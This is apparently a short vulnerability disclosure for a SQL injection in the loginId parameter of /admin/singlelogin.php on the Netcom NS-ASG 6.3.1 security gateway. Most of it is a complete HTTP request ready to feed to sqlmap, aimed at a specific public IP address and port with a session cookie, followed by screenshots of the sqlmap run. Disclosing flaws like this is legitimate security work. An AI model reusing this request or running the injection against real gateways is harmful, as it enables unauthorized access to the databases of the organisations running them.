Netcom NS-ASG application security gateway has SQL injection vulnerability

version:NS-ASG 6.3.1

![image](https://github.com/aknbg1thub/cve/assets/105481616/64c11eeb-1b01-46e8-b4da-961f5c197d63)

url:/admin/singlelogin.php

1.log in page
![image](https://github.com/aknbg1thub/cve/assets/105481616/4c031678-de76-4e66-b325-1ff84da54457)

2.Inject the loginid parameter at the login point
GET /admin/singlelogin.php?submit=1&loginId=1* HTTP/1.1
Host: 218.75.78.54:4443
Cookie: PHPSESSID=08de4bddc8c53141eced1b928c54290d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 1.1.1.1
Te: trailers
Connection: close
3.Run injection through sqlmap
![image](https://github.com/aknbg1thub/cve/assets/105481616/5ab1ddb3-bea7-4478-899d-57699d77cf98)

![image](https://github.com/aknbg1thub/cve/assets/105481616/8f044f10-306c-487c-9b5e-ee2119c647e6)
